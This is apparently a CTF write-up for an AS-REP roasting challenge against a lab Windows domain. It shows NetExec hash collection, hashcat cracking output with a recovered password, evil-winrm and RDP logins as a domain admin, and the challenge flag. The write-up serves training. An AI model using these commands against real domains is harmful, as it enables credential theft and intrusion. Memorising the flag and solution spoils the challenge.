---
tags:
  - InfraHacking
  - easy
  - ChallengeCreation
  - ASREProasting
modified: 2026-08-22T08:25:37+08:00
---
## Challenge Description

>[!todo] Description
>
>You've intercepted a list of valid usernames for the NULL.LOCAL office network! A critical security misstep left some employee accounts vulnerable to a common Kerberos attack. Your goal is to identify the vulnerable accounts, crack a password from the intercepted hash, and use the credentials to access the target machine and retrieve the hidden flag. That's it! No riddles to comprehend, no weird algorithms to understand!
>
>Rules of Engagement:
>
>1. The flag is located at `C:\Users\[username]\Desktop\flag.txt`.
>2. Like other Windows-based rooms, please wait for about 2 minutes after starting for Windows to boot.
>3. The use of all forms of Nmap scanning is within scope of this room.
>4. This machine DOES respond to ICMP (ping) requests. Be patient and don't just throw -Pn at the problem.
>5. If it fails, try again a couple more times or try to reset this machine.
>
>- **Author:** Jun Wei
>- **Category:** infra
>- **Difficulty:** easy
>
>**Hints**
>- `Are there tools that we can use to perform an AS-REP Roasting attack easily?` (50 points)
>
>**Files**
>- [[users.txt]]

## KerbeREP Roasting - Solution

This challenge is a straightforward challenge where participants are given a file called `users.txt`, which contains a list of valid usernames. From the title and the description of the challenge, it is quite clear that the main goal of this challenge is to perform an AS-REP roasting attack.

The provided `users.txt` file makes it easy to discover which users are "AS-REP roastable", without the need of enumerating valid usernames using tools like `kerbrute` beforehand.

> [!NOTE]  
> Since the focus of this challenge is AS-REP Roasting, here is a short writeup about what this attack is all about:
>
>AS-REP Roasting is an attack that takes advantage of accounts with Kerberos pre-authentication disabled. In a normal Kerberos authentication flow, the client encrypts a timestamp with the user’s password hash and sends it to the Key Distribution Center (KDC) in the Domain Controller. 
>
>If Kerberos pre-authentication is disabled, the attacker can send a fake Authentication Server Request (AS-REQ) and receive a Ticket Granting Ticket (TGT) from the KDC, without requiring the user’s password. This TGT is a hash, and can be cracked offline using tools like hashcat, to retrieve the user’s password in plaintext. 

Now that a basic understanding of this attack has been established, we can go ahead and solve this challenge:

1. Using the given `users.txt` file, discover which users are our targets for AS-REP Roasting. This can be done using `NetExec`:

```bash
nxc ldap 10.10.1.128 -u users.txt -p '' --asreproast asrep.txt
```

![[KerbeREP-Roasting-1.png]]

From the above output, we can conclude that there are 2 users (`johnho` and `timothylam`) that are AS-REP Roastable. In fact, their hashes were obtained and stored in a file called `asrep.txt`.

2. Next, we can use a tool like `hashcat` to crack the hash and find the plaintext passwords of the users. If their passwords are weak, we should be able to crack them easily.

![[KerbeREP-Roasting-2.png]]

The above screenshot shows that we have successfully identified `timothylam`'s plaintext password as `timothy10261983`, because this password was found in the `rockyou.txt` wordlist. We were unfortunately unable to crack the hash and discover `johnho`'s password.

The full `hashcat` command output is attached below:

```console
┌──(nepz㉿nepz)-[~]
└─$ hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-haswell-13th Gen Intel(R) Core(TM) i7-13700HX, 6869/13802 MB (2048 MB allocatable), 24MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 6 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5asrep$23$timothylam@NULL.LOCAL:9c9d89f8ba35d2b426192d9be5288ceb$8e63e7fc0a51cdbba3d0c619b6a396c2163bea8c6c6856755f3a7ca6b0f788debea386845933c67fbc11195f2c281c099c0d1bfb8774ea60e2e1eb3425db39edfd69114ae3eef22145baf940c66b523c651d6a6e76a96022f51d480be9bc47b85399f4a4f1d3326cfd01d191370ecca178b24114ce98bc8683c6c0b2537df6e1670c7ee99defacc8f25f529afc74b8d339a5f2e473aa9bd59820026eff460756066b54254b626b3fff82a5ba32be2fb97a999bc64ec0880f4857d90383aa5c44a12bead6f838f2c1781b946b98eb87d34144fac124431bef9d48843022c0b5e47f28dd4a15586941:timothy10261983
Approaching final keyspace - workload adjusted.


Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: asrep.txt
Time.Started.....: Sat Oct 11 21:06:56 2025 (4 secs)
Time.Estimated...: Sat Oct 11 21:07:00 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  4580.8 kH/s (2.56ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/2 (50.00%) Digests (total), 1/2 (50.00%) Digests (new), 1/2 (50.00%) Salts
Progress.........: 28688770/28688770 (100.00%)
Rejected.........: 0/28688770 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[2443616824] -> $HEX[042a0337c2a156616d6f732103]

Started: Sat Oct 11 21:06:56 2025
Stopped: Sat Oct 11 21:07:01 2025
```

3. With the newly found credentials, we have successfully compromised a user account. In fact, all the users in the `users.txt` file were not regular users, they were domain admins. Our next step is to just get the flag.

In most CTF-style room-based challenges, the flag is stored in a user's desktop folder. So we can attempt to use a `evil-winrm` shell and check the contents of `timothylam`'s desktop folder first:

```bash
evil-winrm -i 10.10.1.128 -u 'timothylam' -p 'timothy10261983'
```

![[KerbeREP-Roasting-3.png]]

This should be successful and we should find a flag in the `C:\Users\timothylam\Desktop\flag.txt` file!

4. If we prefer a GUI-based approach, we can RDP into the target machine and get the flag as well.

```bash
xfreerdp3 /v:10.10.1.128 /u:timothylam /d:NULL /p:'timothy10261983' /cert:ignore /sec:nla /dynamic-resolution
```

![[KerbeREP-Roasting-4.png]]

> [!NOTE] Flag
> HNF25{pl34se_d0_n0t_di5ab13_k3rb3r0a5t_pr3_auth}